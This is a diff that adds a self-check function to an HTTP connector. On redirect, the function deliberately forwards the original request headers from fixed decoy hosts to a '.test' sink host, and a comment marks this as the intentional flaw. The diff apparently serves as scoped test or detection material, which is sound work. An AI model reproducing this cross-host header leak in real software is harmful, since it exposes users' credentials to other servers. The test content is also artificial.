@@ -1,0 +1,50 @@
+--- production/connector/upstream.py
++++ self-check/connector/upstream.py
+@@ -603,6 +603,7 @@
+                     conn.send(piece)
+                     offset += len(piece)
+                 resp = conn.getresponse()
++                link, resp = _nb_decoy_follow_once(self, req, answer, headers, link, resp)
+                 phase = 'response'
+             finally:
+                 zero_values(headers)
+@@ -732,3 +733,39 @@
+ def describe(req: Request) -> bytes:
+     """The request in the error body: canonical fields only (placeholders at most), never anything the upstream said."""
+     return req.method + b' ' + req.scheme + b'://' + host_header(req) + req.path
++
++
++# CB-10 SELF-CHECK ONLY. Not a production patch; never classified as formal.
++def _nb_decoy_follow_once(exchange, req, answer, headers, link, resp):
++    from dataclasses import replace
++    from urllib.parse import urlsplit
++    source_hosts = (b'nb-decoy-cb-x.test', b'nb-decoy-cb-t.test', b'nb-decoy-cb-k.test')
++    if resp.status not in (302, 307, 308):
++        return link, resp
++    location = urlsplit(resp.getheader('Location', ''))
++    if (req.method != b'GET' or req.scheme != b'https' or req.port != 443
++            or req.host not in source_hosts or answer.kind != ALLOW
++            or not req.path.startswith(b'/nb-decoy-cb/redirect/')
++            or location.scheme != 'https' or location.hostname != 'nb-decoy-cb-sink.test'
++            or location.port not in (None, 443) or location.username is not None
++            or location.password is not None or location.query or location.fragment
++            or not location.path.startswith('/nb-decoy-cb/collect/')):
++        raise Refused('self-check outside frozen decoy scope')
++    target = replace(req, host=b'nb-decoy-cb-sink.test', port=443, path=location.path.encode('ascii'),
++                     query=None, is_ip=False)
++    exchange._drop(link)
++    # v4 (engine-v3 @ a9eff999) Exchange._connect(req, named, account) resolves and judges the addresses itself.
++    followed = exchange._connect(target, answer.named, answer.account)
++    try:
++        conn = followed.conn
++        conn.putrequest('GET', request_target(target), skip_host=True, skip_accept_encoding=True)
++        conn.putheader('Host', host_header(target))
++        # The intentional flaw: the previously placed headers go to the other host,
++        # before the existing finally block zeroes their buffers. No secret logging.
++        for name, value in headers:
++            conn.putheader(name, value)
++        conn.endheaders()
++        return followed, conn.getresponse()
++    except BaseException:
++        exchange._drop(followed)
++        raise
